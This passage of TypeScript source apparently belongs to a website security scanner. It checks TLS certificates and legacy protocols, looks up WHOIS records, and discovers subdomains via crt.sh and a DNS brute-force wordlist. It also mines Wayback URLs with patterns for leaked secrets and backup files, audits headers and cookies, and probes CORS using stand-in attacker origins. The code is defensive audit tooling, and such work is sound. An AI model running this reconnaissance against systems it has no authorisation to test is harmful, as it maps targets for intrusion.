          const expiresAt = new Date(cert.valid_to);
          const daysLeft = Math.floor((expiresAt.getTime() - Date.now()) / 86_400_000);
          if (daysLeft < 0) {
            f.push({
              title: "SSL Certificate Expired",
              severity: "critical",
              description: `Certificate for ${hostname} expired ${Math.abs(daysLeft)} day(s) ago. All browsers show a blocking error. The connection is not trusted.`,
              cvss: 9.1, cve: null,
              evidence: `Expired: ${cert.valid_to} (${Math.abs(daysLeft)} days ago)\nSubject: ${cert.subject?.CN ?? hostname}`,
              remediation: "Renew the certificate immediately. Set up automated renewal with Certbot or your CA.",
            });
          } else if (daysLeft < 14) {
            f.push({
              title: `SSL Certificate Expiring in ${daysLeft} Day(s)`,
              severity: "high",
              description: `Certificate expires in ${daysLeft} days. If not renewed, users will see blocking browser errors.`,
              cvss: 7.5, cve: null,
              evidence: `Expiry: ${cert.valid_to}\nDays remaining: ${daysLeft}`,
              remediation: "Renew immediately. Automate certificate renewal to prevent future outages.",
            });
          } else if (daysLeft < 30) {
            f.push({
              title: `SSL Certificate Expiring Soon (${daysLeft} days)`,
              severity: "medium",
              description: `Certificate expires in ${daysLeft} days. Plan renewal to avoid service disruption.`,
              cvss: 5.3, cve: null,
              evidence: `Expiry: ${cert.valid_to}\nDays remaining: ${daysLeft}`,
              remediation: "Renew the certificate within the next few days. Consider automated renewal.",
            });
          } else {
            await onLog(`[${ts()}] TLS cert valid for ${daysLeft} more days (OK)`);
          }

          // Subject mismatch
          const cn = cert.subject?.CN ?? "";
          const altNames: string[] = (cert.subjectaltname ?? "")
            .split(",")
            .map((s: string) => s.trim().replace(/^DNS:/, ""));
          const hostCovered = cn === hostname || altNames.some((n) =>
            n === hostname || (n.startsWith("*.") && hostname.endsWith(n.slice(1)))
          );
          if (!hostCovered && cn) {
            f.push({
              title: "SSL Certificate Subject Mismatch",
              severity: "high",
              description: `The certificate CN (${cn}) and Subject Alt Names do not include ${hostname}. Browsers show a security warning and refuse the connection without user override.`,
              cvss: 7.4, cve: null,
              evidence: `Requested host: ${hostname}\nCertificate CN: ${cn}\nSANs: ${altNames.join(", ") || "(none)"}`,
              remediation: "Reissue the certificate with the correct hostname in the Subject Alternative Name field.",
            });
          }

          // Certificate age (very long validity)
          const issuedAt = cert.valid_from ? new Date(cert.valid_from) : null;
          if (issuedAt) {
            const totalDays = (expiresAt.getTime() - issuedAt.getTime()) / 86_400_000;
            if (totalDays > 398) {
              f.push({
                title: "SSL Certificate Validity Period Exceeds 398 Days",
                severity: "low",
                description: `Certificate has a validity period of ${Math.round(totalDays)} days. Apple, Google, and Mozilla browsers cap trusted certificate validity at 398 days; longer certificates may not be trusted by modern browsers.`,
                cvss: 3.1, cve: null,
                evidence: `Issued: ${cert.valid_from}\nExpires: ${cert.valid_to}\nValidity: ${Math.round(totalDays)} days`,
                remediation: "When renewing, issue certificates with a maximum validity of 90 days (recommended) or 398 days (maximum).",
              });
            }
          }

          resolve(f);
        } catch (e) {
          resolve(f);
        }
      },
    );
    socket.on("error", () => resolve(f));
    socket.setTimeout(12_000, () => { socket.destroy(); resolve(f); });
  });

  findings.push(...certResult);

  // ── Test for SSLv3 / legacy protocol via openssl ──────────────────────────
  const legacyTests = [
    { flag: "-ssl3",  proto: "SSLv3",   severity: "critical" as const, cvss: 9.4, cve: "CVE-2014-3566" },
    { flag: "-tls1",  proto: "TLS 1.0", severity: "high" as const,     cvss: 7.4, cve: null },
    { flag: "-tls1_1",proto: "TLS 1.1", severity: "medium" as const,   cvss: 5.9, cve: null },
  ];
  for (const test of legacyTests) {
    try {
      const { stdout, stderr } = await execFileAsync(
        "openssl",
        ["s_client", "-connect", `${hostname}:${port}`, "-servername", hostname, test.flag, "-brief"],
        { timeout: 8_000 },
      ).catch((err: any) => ({ stdout: err.stdout ?? "", stderr: err.stderr ?? "" }));
      const combined = stdout + stderr;
      if (combined.includes("Verification:") || combined.includes("CONNECTED") || combined.includes("Protocol  :")) {
        findings.push({
          title: `Legacy Protocol Accepted: ${test.proto}`,
          severity: test.severity,
          description: `Server accepted a ${test.proto} handshake. ${test.proto === "SSLv3" ? "SSLv3 is affected by the POODLE vulnerability (CVE-2014-3566) which allows decryption of encrypted traffic. " : ""}This protocol is deprecated and should be disabled.`,
          cvss: test.cvss, cve: test.cve,
          evidence: `openssl s_client ${test.flag} -connect ${hostname}:${port} succeeded\nOutput: ${combined.slice(0, 300)}`,
          remediation: `Disable ${test.proto} support on the web server. Only TLS 1.2 and TLS 1.3 should be permitted.`,
        });
      }
    } catch { /* connection refused = protocol not supported = good */ }
  }

  await onLog(`[${ts()}] TLS analysis complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 4. WHOIS — domain registration intelligence
// ═══════════════════════════════════════════════════════════════════════════════

async function checkWhois(hostname: string, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  // Extract root domain (e.g. sub.example.com → example.com)
  const parts = hostname.split(".");
  const rootDomain = parts.length > 2 ? parts.slice(-2).join(".") : hostname;

  await onLog(`[${ts()}] Running whois for ${rootDomain}...`);

  try {
    const { stdout } = await execFileAsync("whois", [rootDomain], { timeout: 20_000 });
    const w = stdout.toLowerCase();

    // Expiry date
    const expiryMatch = stdout.match(/(?:Registry Expiry Date|Expiry Date|Expiration Date|paid-till):\s*(\S+)/i);
    if (expiryMatch) {
      const expiryStr = expiryMatch[1]!;
      const expiry = new Date(expiryStr);
      if (!isNaN(expiry.getTime())) {
        const daysLeft = Math.floor((expiry.getTime() - Date.now()) / 86_400_000);
        await onLog(`[${ts()}] Domain expiry: ${expiryStr} (${daysLeft} days)`);
        if (daysLeft < 30) {
          findings.push({
            title: `Domain Expiring in ${daysLeft} Day(s) — Risk of Takeover`,
            severity: daysLeft < 7 ? "critical" : "high",
            description: `The domain ${rootDomain} expires in ${daysLeft} day(s). An expired domain can be registered by anyone, redirecting all traffic and email to an attacker-controlled server.`,
            cvss: daysLeft < 7 ? 9.8 : 8.1, cve: null,
            evidence: `whois ${rootDomain}\nExpiry: ${expiryStr}\nDays remaining: ${daysLeft}`,
            remediation: "Renew the domain immediately. Enable auto-renewal at your registrar. Set up calendar alerts at 90, 30, 7 day thresholds.",
          });
        }
      }
    }

    // Registrar
    const registrarMatch = stdout.match(/Registrar:\s*(.+)/i);
    if (registrarMatch) {
      await onLog(`[${ts()}] Registrar: ${registrarMatch[1]!.trim()}`);
    }

    // Privacy protection check
    if (!w.includes("redacted") && !w.includes("privacy") && !w.includes("protected")) {
      const emailMatch = stdout.match(/Registrant Email:\s*(\S+@\S+)/i);
      if (emailMatch && !emailMatch[1]!.includes("redacted")) {
        findings.push({
          title: "WHOIS Registrant Email Publicly Exposed",
          severity: "low",
          description: `The registrant email address (${emailMatch[1]}) is publicly visible in WHOIS. This enables targeted phishing attacks against domain owners and facilitates social engineering attempts.`,
          cvss: 3.1, cve: null,
          evidence: `whois ${rootDomain}\nRegistrant Email: ${emailMatch[1]}`,
          remediation: "Enable WHOIS privacy protection / GDPR redaction at your registrar to hide personal contact information.",
        });
      }
    }

    // Nameserver consistency check
    const nsMatches = [...stdout.matchAll(/Name Server:\s*(\S+)/gi)].map((m) => m[1]!.toLowerCase());
    if (nsMatches.length === 0) {
      const digNs = await digQuery(rootDomain, "NS");
      if (digNs.length === 0) {
        findings.push({
          title: "No Nameservers Found for Domain",
          severity: "high",
          description: `No nameservers found for ${rootDomain} in WHOIS or DNS. This may indicate a misconfigured or abandoned domain at risk of takeover.`,
          cvss: 7.5, cve: null,
          evidence: `whois ${rootDomain}: no Name Server entries\ndig NS ${rootDomain}: no results`,
          remediation: "Configure authoritative nameservers for the domain at your registrar.",
        });
      }
    } else {
      await onLog(`[${ts()}] Nameservers: ${nsMatches.join(", ")}`);
    }

  } catch (err: any) {
    await onLog(`[${ts()}] whois lookup failed: ${err?.message ?? String(err)}`);
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 5. SUBDOMAIN DISCOVERY — crt.sh certificate transparency
// ═══════════════════════════════════════════════════════════════════════════════

async function discoverSubdomains(hostname: string, onLog: LogFn): Promise<{ subs: string[]; findings: RealFinding[] }> {
  const findings: RealFinding[] = [];
  const subs: string[] = [];

  // Extract root domain
  const parts = hostname.split(".");
  const rootDomain = parts.length > 2 ? parts.slice(-2).join(".") : hostname;

  await onLog(`[${ts()}] Querying crt.sh certificate transparency for ${rootDomain} subdomains...`);

  try {
    const r = await probe(
      `https://crt.sh/?q=%.${rootDomain}&output=json`,
      { timeoutMs: 20_000 },
    );
    if (r && r.status === 200 && r.body.startsWith("[")) {
      const records: Array<{ name_value: string }> = JSON.parse(r.body);
      const nameSet = new Set<string>();
      for (const rec of records) {
        for (const name of rec.name_value.split("\n")) {
          const n = name.trim().toLowerCase().replace(/^\*\./, "");
          if (n.endsWith(`.${rootDomain}`) || n === rootDomain) {
            nameSet.add(n);
          }
        }
      }
      const uniqueSubs = [...nameSet].filter((n) => n !== rootDomain);
      await onLog(`[${ts()}] crt.sh found ${uniqueSubs.length} unique subdomain(s)`);
      subs.push(...uniqueSubs.slice(0, 50)); // limit to 50

      // Check for interesting subdomains
      const interesting = uniqueSubs.filter((s) =>
        /admin|dev|staging|test|internal|api|vpn|uat|qa|demo|beta|old|legacy|backup|db|mail|portal|dashboard|corp|login/i.test(s)
      );

      if (interesting.length > 0) {
        await onLog(`[${ts()}] Interesting subdomains: ${interesting.slice(0, 10).join(", ")}`);
        findings.push({
          title: `${interesting.length} Sensitive Subdomain(s) Discovered via Certificate Transparency`,
          severity: "medium",
          description: `Certificate transparency logs reveal ${interesting.length} subdomain(s) that may indicate internal, staging, admin, or development environments. These are often less hardened than production.`,
          cvss: 5.3, cve: null,
          evidence: `crt.sh query for *.${rootDomain}\nSensitive subdomains found:\n${interesting.slice(0, 15).join("\n")}`,
          remediation: "Audit each discovered subdomain: ensure it is intentionally public, properly secured, and not leaking internal services. Consider wildcard certificate usage to reduce certificate transparency exposure.",
        });
      }

      if (uniqueSubs.length > 20) {
        findings.push({
          title: `Large Attack Surface: ${uniqueSubs.length} Subdomains Discovered`,
          severity: "low",
          description: `Certificate transparency logs show ${uniqueSubs.length} subdomains for ${rootDomain}. Each subdomain is a potential entry point and increases the overall attack surface.`,
          cvss: 3.7, cve: null,
          evidence: `Total subdomains: ${uniqueSubs.length}\nSample: ${uniqueSubs.slice(0, 10).join(", ")}`,
          remediation: "Regularly audit all active subdomains. Remove DNS records for decommissioned services to prevent subdomain takeover. Implement a subdomain inventory process.",
        });
      }
    }
  } catch (err: any) {
    await onLog(`[${ts()}] crt.sh lookup error: ${err?.message ?? String(err)}`);
  }

  // ── DNS brute force — common subdomains ───────────────────────────────────
  const COMMON_SUBS = [
    "www", "mail", "email", "smtp", "pop", "imap", "ftp", "vpn", "ssh",
    "api", "api2", "v1", "v2", "dev", "development", "staging", "test",
    "uat", "qa", "beta", "alpha", "demo", "sandbox", "internal", "intranet",
    "admin", "administrator", "portal", "dashboard", "manage", "management",
    "ns1", "ns2", "mx", "mx1", "cdn", "static", "assets", "media", "img",
    "db", "database", "mysql", "mongo", "redis", "elastic", "kibana",
    "jenkins", "gitlab", "github", "jira", "confluence", "grafana",
    "monitoring", "metrics", "prometheus", "logs", "logging",
    "backup", "old", "legacy", "archive",
    "mobile", "app", "apps", "m",
    "store", "shop", "pay", "payments", "billing", "accounts",
    "login", "auth", "sso", "oauth", "id",
    "support", "help", "status", "uptime",
  ];

  await onLog(`[${ts()}] DNS brute-forcing ${COMMON_SUBS.length} common subdomains...`);
  let bruteFound = 0;

  const results = await Promise.allSettled(
    COMMON_SUBS.map(async (sub) => {
      const fqdn = `${sub}.${rootDomain}`;
      if (subs.includes(fqdn)) return null; // already found via crt.sh
      try {
        const addrs = await dnsResolve.resolve4(fqdn).catch(() => [] as string[]);
        if (addrs.length > 0) {
          return { fqdn, ips: addrs };
        }
        return null;
      } catch {
        return null;
      }
    }),
  );

  const bruteResults: { fqdn: string; ips: string[] }[] = [];
  for (const r of results) {
    if (r.status === "fulfilled" && r.value) {
      bruteResults.push(r.value);
      bruteFound++;
      if (!subs.includes(r.value.fqdn)) subs.push(r.value.fqdn);
    }
  }

  if (bruteFound > 0) {
    await onLog(`[${ts()}] DNS brute-force found ${bruteFound} additional subdomain(s)`);
    const newSubs = bruteResults.map((r) => `${r.fqdn} → ${r.ips.join(", ")}`);
    const devSubs = bruteResults.filter((r) => /dev|staging|test|qa|uat|admin|internal/i.test(r.fqdn));
    if (devSubs.length > 0) {
      findings.push({
        title: `Development/Staging Subdomains Accessible (${devSubs.length} found)`,
        severity: "medium",
        description: `${devSubs.length} development or staging subdomain(s) are publicly accessible. These environments typically have weaker security controls, debug modes enabled, and may expose test credentials or internal data.`,
        cvss: 6.1, cve: null,
        evidence: `DNS brute-force discovered:\n${devSubs.map((r) => `${r.fqdn} → ${r.ips.join(", ")}`).join("\n")}`,
        remediation: "Restrict access to dev/staging environments via IP allowlisting or VPN. Ensure test credentials and data are not accessible from production-facing subdomains.",
      });
    }
  }

  return { subs, findings };
}

// ═══════════════════════════════════════════════════════════════════════════════
// 6. IP GEOLOCATION & ASN — ipinfo.io (free, no auth required)
// ═══════════════════════════════════════════════════════════════════════════════

async function getIpInfo(hostname: string, onLog: LogFn): Promise<void> {
  try {
    const ips = await digQuery(hostname, "A");
    if (ips.length === 0) return;
    const ip = ips[0]!;
    const r = await probe(`https://ipinfo.io/${ip}/json`, { timeoutMs: 8_000 });
    if (r && r.status === 200) {
      const info = JSON.parse(r.body);
      await onLog(`[${ts()}] IP Intel: ${ip} | ${info.org ?? "Unknown ASN"} | ${info.city ?? ""}, ${info.country ?? ""} | Hosting: ${info.hostname ?? "—"}`);
    }
  } catch { /* ipinfo.io unavailable */ }
}

// ═══════════════════════════════════════════════════════════════════════════════
// 7. WAYBACK MACHINE — historical endpoint discovery
// ═══════════════════════════════════════════════════════════════════════════════

async function checkWayback(hostname: string, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Querying Wayback Machine CDX API for historical endpoints...`);

  try {
    const url = `https://web.archive.org/cdx/search/cdx?url=${hostname}/*&output=json&fl=original&collapse=urlkey&limit=200&filter=statuscode:200`;
    const r = await probe(url, { timeoutMs: 20_000 });
    if (!r || r.status !== 200) return findings;

    const rows: string[][] = JSON.parse(r.body);
    if (rows.length < 2) return findings; // first row is headers

    const urls = rows.slice(1).map((r) => r[0]!).filter(Boolean);
    await onLog(`[${ts()}] Wayback Machine: ${urls.length} historical URL(s) found`);

    // Identify sensitive historical paths
    const sensitive = urls.filter((u) =>
      /\.(sql|bak|backup|zip|tar|gz|env|config|conf|cfg|log|xml|json|key|pem|cer|p12|pfx|yaml|yml|ini|htpasswd|git|svn)(\?|$)/i.test(u) ||
      /\/admin|\/backup|\/\.env|\/config|\/debug|\/test|\/dev|\/api\/internal|\/private/i.test(u)
    );

    if (sensitive.length > 0) {
      findings.push({
        title: `${sensitive.length} Sensitive Historical URL(s) in Wayback Machine`,
        severity: "medium",
        verification: "suspected",
        confidence: 55,
        description: `The Wayback Machine has archived ${sensitive.length} URL(s) that may represent sensitive file paths, backup files, or admin interfaces. These paths may still be accessible if not properly secured.`,
        cvss: 5.3, cve: null,
        evidence: `Wayback CDX query for ${hostname}/*\nSensitive URLs found:\n${sensitive.slice(0, 15).join("\n")}`,
        remediation: "Audit each sensitive URL to verify it is no longer accessible. Remove backup and config files from the web root. Add rules to robots.txt and verify via direct access testing.",
      });
    }

    // Check for exposed API keys in historical URLs
    const apiKeyUrls = urls.filter((u) =>
      /api[_-]?key=|apikey=|access_token=|secret=|password=|passwd=|pwd=|token=/i.test(u)
    );
    if (apiKeyUrls.length > 0) {
      findings.push({
        title: "API Keys or Secrets Found in Historical URLs",
        severity: "high",
        verification: "suspected",
        confidence: 60,
        description: `${apiKeyUrls.length} historical URL(s) contain query parameters that look like API keys, tokens, or passwords. This proves historical disclosure in an archive, but does not prove the values are still valid or that the current site serves them.`,
        cvss: 8.1, cve: null,
        evidence: `Wayback Machine URLs with credentials:\n${apiKeyUrls.slice(0, 5).join("\n")}`,
        remediation: "Revoke all exposed credentials immediately. Remove secrets from URLs — use POST bodies or headers instead. Audit git history and CDN logs for additional exposure.",
      });
    }

  } catch (err: any) {
    await onLog(`[${ts()}] Wayback lookup error: ${err?.message ?? "timeout"}`);
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 8. HTTP SECURITY HEADERS — comprehensive check
// ═══════════════════════════════════════════════════════════════════════════════

async function checkHeaders(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const r = await probe(target.url, { timeoutMs: 12_000 });
  if (!r) {
    await onLog(`[${ts()}] WARNING: Could not reach ${target.url} for header check`);
    return findings;
  }

  const h = r.headers;
  const ev = (info: string) => `GET ${target.url} → HTTP ${r.status}\nResponse headers:\n${r.rawHeaders}\n\n${info}`;
  await onLog(`[${ts()}] HTTP ${r.status} — checking ${Object.keys(h).length} response headers...`);

  // HTTP to HTTPS redirect
  if (!target.isHttps) {
    const httpR = await probe(`http://${target.hostname}/`, { followRedirects: false, timeoutMs: 8_000 });
    if (httpR && httpR.status >= 200 && httpR.status < 300) {
      findings.push({
        title: "HTTP Not Redirected to HTTPS",
        severity: "high",
        description: "The server serves content over unencrypted HTTP without redirecting to HTTPS. All traffic is transmitted in plaintext, exposing credentials, session tokens, and user data to network interception.",
        cvss: 7.4, cve: null,
        evidence: `GET http://${target.hostname}/ → HTTP ${httpR.status} (no redirect to HTTPS)`,
        remediation: "Configure a 301 permanent redirect from HTTP to HTTPS. In Nginx: return 301 https://$host$request_uri; In Apache: RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]",
      });
    }
  }

  // HSTS
  const hsts = h["strict-transport-security"];
  if (target.isHttps && !hsts) {
    findings.push({
      title: "Missing HTTP Strict Transport Security (HSTS)",
      severity: "medium",
      description: "HSTS header is absent. Without HSTS, browsers allow downgrade attacks where an attacker intercepts the first HTTP request before the HTTPS redirect, enabling session hijacking.",
      cvss: 6.1, cve: null,
      evidence: ev("Strict-Transport-Security: (absent)"),
      remediation: "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\nAfter testing, submit the domain to the HSTS preload list.",
    });
  } else if (hsts) {
    const maxAgeMatch = hsts.match(/max-age=(\d+)/i);
    const maxAge = maxAgeMatch ? parseInt(maxAgeMatch[1]!) : 0;
    if (maxAge < 31536000) {
      findings.push({
        title: "HSTS max-age Too Short",
        severity: "low",
        description: `HSTS max-age is ${maxAge} seconds (${Math.round(maxAge / 86400)} days). Browsers will allow HTTP connections after this window expires, creating brief downgrade attack opportunities.`,
        cvss: 3.1, cve: null,
        evidence: ev(`Strict-Transport-Security: ${hsts}`),
        remediation: "Set max-age to at least 31536000 (1 year): Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
      });
    }
  }

  // Content-Security-Policy
  if (!h["content-security-policy"]) {
    findings.push({
      title: "Missing Content-Security-Policy Header",
      severity: "medium",
      description: "No CSP header is set. Without CSP, XSS attacks can load scripts from any external origin, access the DOM, exfiltrate data via fetch/image requests, and install keyloggers.",
      cvss: 6.1, cve: null,
      evidence: ev("Content-Security-Policy: (absent)"),
      remediation: "Implement a strict CSP. Start with: Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none'; Tighten after testing.",
    });
  } else {
    const csp = h["content-security-policy"];
    if (/unsafe-eval/i.test(csp)) {
      findings.push({
        title: "CSP Contains 'unsafe-eval'",
        severity: "medium",
        description: "CSP includes 'unsafe-eval', which allows JavaScript evaluation functions like eval(), setTimeout(string), and new Function(). This significantly weakens XSS protection.",
        cvss: 5.3, cve: null,
        evidence: ev(`Content-Security-Policy: ${csp.slice(0, 200)}`),
        remediation: "Remove 'unsafe-eval'. Refactor code to avoid eval-based patterns. Use nonces or hashes for inline scripts instead.",
      });
    }
    if (/unsafe-inline/i.test(csp) && !/nonce-|hash-|sha/i.test(csp)) {
      findings.push({
        title: "CSP Contains 'unsafe-inline' Without Nonce/Hash",
        severity: "medium",
        description: "CSP allows all inline scripts via 'unsafe-inline'. Without a nonce or hash, any injected inline script (from XSS) executes, defeating the purpose of CSP.",
        cvss: 5.3, cve: null,
        evidence: ev(`Content-Security-Policy: ${csp.slice(0, 200)}`),
        remediation: "Replace 'unsafe-inline' with nonce-based CSP: Content-Security-Policy: script-src 'nonce-{random-per-request}'",
      });
    }
    if (/\*/.test(csp.split("script-src")[1]?.split(";")[0] ?? "")) {
      findings.push({
        title: "CSP script-src Allows Wildcard Origin",
        severity: "high",
        description: "CSP script-src includes a wildcard (*), allowing scripts to load from any external domain. This completely bypasses XSS script-injection protection.",
        cvss: 7.4, cve: null,
        evidence: ev(`Content-Security-Policy: ${csp.slice(0, 300)}`),
        remediation: "Replace wildcard with explicit trusted domains. Never use * in script-src.",
      });
    }
  }

  // X-Frame-Options
  const xfo = h["x-frame-options"] ?? "";
  const cspFa = h["content-security-policy"] ?? "";
  if (!xfo && !cspFa.toLowerCase().includes("frame-ancestors")) {
    findings.push({
      title: "Clickjacking Protection Missing (X-Frame-Options / CSP frame-ancestors)",
      severity: "medium",
      description: "No clickjacking protection is configured. An attacker can embed this page in a transparent iframe on a malicious site to trick users into clicking on invisible UI elements (account deletion, fund transfers, etc.).",
      cvss: 6.1, cve: null,
      evidence: ev("X-Frame-Options: (absent)\nCSP frame-ancestors: (absent)"),
      remediation: "Add: X-Frame-Options: DENY (or SAMEORIGIN)\nOr in CSP: Content-Security-Policy: frame-ancestors 'none'",
    });
  }

  // X-Content-Type-Options
  if (!h["x-content-type-options"]) {
    findings.push({
      title: "Missing X-Content-Type-Options Header",
      severity: "low",
      description: "Without X-Content-Type-Options: nosniff, browsers may MIME-sniff responses. An attacker can serve a file with a misleading MIME type (e.g., an HTML file served as image) that browsers execute as script.",
      cvss: 3.7, cve: null,
      evidence: ev("X-Content-Type-Options: (absent)"),
      remediation: "Add: X-Content-Type-Options: nosniff",
    });
  }

  // Referrer-Policy
  if (!h["referrer-policy"]) {
    findings.push({
      title: "Missing Referrer-Policy Header",
      severity: "low",
      description: "Without Referrer-Policy, the full URL (including query parameters) is sent as the Referer header to external sites, potentially leaking session tokens or user IDs.",
      cvss: 3.1, cve: null,
      evidence: ev("Referrer-Policy: (absent)"),
      remediation: "Add: Referrer-Policy: strict-origin-when-cross-origin",
    });
  }

  // Permissions-Policy
  if (!h["permissions-policy"]) {
    findings.push({
      title: "Missing Permissions-Policy Header",
      severity: "low",
      description: "Without Permissions-Policy, embedded iframes may access browser features (camera, microphone, geolocation, payment APIs) without explicit consent.",
      cvss: 3.1, cve: null,
      evidence: ev("Permissions-Policy: (absent)"),
      remediation: "Add: Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()  (restrict to features you actually use)",
    });
  }

  // Server version disclosure
  const server = h["server"] ?? "";
  if (server && /[\d.]/.test(server)) {
    findings.push({
      title: "Server Version Disclosed",
      severity: "low",
      description: `Server header reveals software and version: "${server}". Attackers can look up known CVEs for this exact version.`,
      cvss: 4.3, cve: null,
      evidence: ev(`Server: ${server}`),
      remediation: "Suppress or genericise the Server header. Nginx: server_tokens off; Apache: ServerTokens Prod; Express: app.disable('x-powered-by')",
    });
  }

  for (const discHeader of ["x-powered-by", "x-aspnet-version", "x-aspnetmvc-version", "x-generator"]) {
    const val = h[discHeader];
    if (val) {
      findings.push({
        title: `Technology Disclosed via ${discHeader}`,
        severity: "low",
        description: `${discHeader}: ${val} reveals framework/platform details to attackers.`,
        cvss: 3.1, cve: null,
        evidence: ev(`${discHeader}: ${val}`),
        remediation: `Suppress the ${discHeader} header in your framework configuration.`,
      });
    }
  }

  // CORS — active tests with distinct attacker origins
  const corsTestOrigins = [
    "https://attacker.com",
    "https://evil.attacker.example",
  ];
  let corsFound = false;
  for (const attackerOrigin of corsTestOrigins) {
    if (corsFound) break;
    const corsR = await probe(target.url, {
      headers: { Origin: attackerOrigin, "Access-Control-Request-Method": "GET" },
      timeoutMs: 8_000,
    });
    if (!corsR) continue;
    const acao = corsR.headers["access-control-allow-origin"] ?? "";
    const acac = corsR.headers["access-control-allow-credentials"] ?? "";
    if (acao === "*") {
      findings.push({
        title: "CORS Wildcard Origin (*) — Any Site Can Read Responses",
        severity: "medium",
        description: "Access-Control-Allow-Origin: * lets any website make cross-origin requests and read responses. If this endpoint returns sensitive data, any malicious site can exfiltrate it from authenticated users.",
        cvss: 6.5, cve: null,
        evidence: `GET ${target.url}\nOrigin: ${attackerOrigin}\nAccess-Control-Allow-Origin: *`,
        remediation: "Replace * with an explicit allowlist of trusted origins. Validate the Origin header server-side before reflecting it.",
      });
      corsFound = true;
    } else if (acao === attackerOrigin && acac.toLowerCase() === "true") {
      // HIGH-severity: reflects exact attacker origin AND sends credentials
      findings.push({
        title: "CRITICAL: CORS Reflects Arbitrary Origin + Credentials",
        severity: "critical",
        description: `Server reflects the attacker-supplied Origin header exactly (${attackerOrigin}) and also sets Access-Control-Allow-Credentials: true. A malicious site can make fully authenticated cross-origin requests on behalf of logged-in users — enabling complete account takeover, data exfiltration, and CSRF bypass.`,
        cvss: 9.0, cve: null,
        evidence: `GET ${target.url}\nOrigin: ${attackerOrigin}\nAccess-Control-Allow-Origin: ${acao}\nAccess-Control-Allow-Credentials: ${acac}`,
        remediation: "Never combine a reflected/dynamic origin with Allow-Credentials: true. Validate Origin against a strict server-side allowlist. Reject any origin not on the list.",
      });
      corsFound = true;
    } else if (acao === attackerOrigin && acac.toLowerCase() !== "true") {
      // MEDIUM: reflects origin but no credentials — less severe but still a risk
      findings.push({
        title: "CORS Reflects Arbitrary Origin (No Credentials)",
        severity: "medium",
        description: `Server reflects the attacker-supplied Origin header (${attackerOrigin}) in Access-Control-Allow-Origin. Without credentials this is lower severity, but combined with a credential leak or sensitive data endpoint, it enables cross-origin data exfiltration.`,
        cvss: 5.3, cve: null,
        evidence: `GET ${target.url}\nOrigin: ${attackerOrigin}\nAccess-Control-Allow-Origin: ${acao}\nAccess-Control-Allow-Credentials: ${acac || "not set"}`,
        remediation: "Validate the Origin header against a strict server-side allowlist. Do not reflect arbitrary origins.",
      });
      corsFound = true;
    }
  }

  // Cookie security
  const setCookie = h["set-cookie"] ?? "";
  if (setCookie) {
    const lower = setCookie.toLowerCase();
    const nameMatch = setCookie.match(/^([^=;,\s]+)/);
    const cookieName = nameMatch?.[1]?.trim() ?? "cookie";
    if (!lower.includes("httponly")) {
      findings.push({
        title: `Cookie Missing HttpOnly Flag (${cookieName})`,
        severity: "medium",
        description: `Cookie "${cookieName}" is readable by JavaScript. Any XSS vulnerability allows session hijacking via document.cookie.`,
        cvss: 6.1, cve: null,
        evidence: `Set-Cookie: ${setCookie.slice(0, 200)}`,
        remediation: `Add HttpOnly flag: Set-Cookie: ${cookieName}=...; HttpOnly; Secure; SameSite=Strict`,
      });
    }
    if (target.isHttps && !lower.includes("secure")) {
      findings.push({
        title: `Cookie Missing Secure Flag (${cookieName})`,
        severity: "medium",
        description: `Cookie "${cookieName}" can be sent over HTTP. SSL stripping attacks can capture it.`,
        cvss: 5.9, cve: null,
        evidence: `Set-Cookie: ${setCookie.slice(0, 200)}`,
        remediation: `Add Secure flag: Set-Cookie: ${cookieName}=...; HttpOnly; Secure; SameSite=Strict`,
      });
    }
    if (!lower.includes("samesite")) {
      findings.push({
        title: `Cookie Missing SameSite Attribute (${cookieName})`,
        severity: "low",
        description: `Cookie "${cookieName}" has no SameSite attribute, enabling CSRF attacks.`,
        cvss: 4.3, cve: null,
        evidence: `Set-Cookie: ${setCookie.slice(0, 200)}`,
        remediation: `Add SameSite: Set-Cookie: ${cookieName}=...; HttpOnly; Secure; SameSite=Strict`,
      });
    }
  }

  // HTTP TRACE method
  const traceR = await probe(target.url, { method: "TRACE", timeoutMs: 6_000 });
  if (traceR && traceR.status === 200) {
    findings.push({
      title: "HTTP TRACE Method Enabled",
      severity: "medium",
      description: "The TRACE method is enabled. Combined with browser plugins or certain XSS vectors, TRACE allows Cross-Site Tracing (XST) attacks that can steal HTTP-only cookies.",
      cvss: 5.3, cve: null,
      evidence: `TRACE ${target.url} → HTTP ${traceR.status}`,
      remediation: "Disable TRACE in web server config. Nginx/Apache: Limit allowed methods to GET, POST, HEAD. TraceEnable Off (Apache).",
    });
  }

  await onLog(`[${ts()}] HTTP header analysis complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 9. TECHNOLOGY FINGERPRINTING
// ═══════════════════════════════════════════════════════════════════════════════

interface TechProfile { name: string; version?: string; category: string; }

async function fingerprint(target: Target, onLog: LogFn): Promise<{ techs: TechProfile[]; findings: RealFinding[] }> {
  const techs: TechProfile[] = [];
  const findings: RealFinding[] = [];
  const r = await probe(target.url);
  if (!r) return { techs, findings };

  const h = r.headers;
  const body = r.body;

  const server = h["server"] ?? "";
  if (server) techs.push({ name: server, category: "Web Server" });

  // WordPress
  if (body.includes("/wp-content/") || body.includes("/wp-includes/") || h["x-pingback"]) {
    const vMatch = body.match(/WordPress\s+([\d.]+)/i);
    techs.push({ name: "WordPress", version: vMatch?.[1], category: "CMS" });
    const wpVer = body.match(/ver=([\d.]+)/)?.[1];
    findings.push({
      title: "WordPress CMS Detected",
      severity: "low",
      description: `WordPress${vMatch?.[1] ? ` ${vMatch[1]}` : ""} detected. WordPress is the most attacked CMS platform. Version fingerprinting enables targeted CVE exploitation.`,
      cvss: 3.7, cve: null,
      evidence: `WordPress indicators found in response body\nVersion hint: ${wpVer ?? "unknown"}`,
